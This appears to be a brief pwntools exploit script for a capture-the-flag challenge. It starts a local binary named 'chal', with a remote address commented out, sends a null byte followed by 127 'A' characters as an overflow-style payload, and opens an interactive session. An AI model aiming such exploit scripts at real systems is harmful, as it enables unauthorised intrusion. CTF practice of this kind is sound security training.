from pwn import * 

io = process("./chal")
# io = remote("35.228.220.66",1305)


io.sendline(b"\0"+b"A"*127)


io.interactive()      
